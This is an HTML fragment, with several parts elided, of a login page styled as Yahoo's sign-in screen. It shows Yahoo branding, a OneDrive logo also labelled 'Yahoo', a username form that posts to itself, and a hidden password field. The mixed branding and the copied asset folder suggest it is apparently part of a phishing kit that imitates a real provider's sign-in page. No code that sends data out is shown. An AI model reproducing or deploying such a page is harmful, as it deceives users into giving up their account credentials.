        ...
        <div class="login-content">
            <div class="login-box ">
                <div class="login-logo">
					<img src="/login_files/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo" width="116">
					<img src="/login_files/onedrive.png" alt="Yahoo" class="logo" height="55">
                </div>
                <form id="login-username-form" method="post" class="username-challenge">
                    ...
                    <div id="username-country-code-field" class="username-country-code cci-dropdown-disabled code-of-length-1">
                        ...
                        <div class="hide-passwd" id="dPass">
                            <input name="passwd" id="passwd" type="password" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" required>
                        </div>
                    </div>
					...
					<p class="row error hide" role="alert" data-error="messages.ERROR_INVALID_USERNAME"  id="password-error">
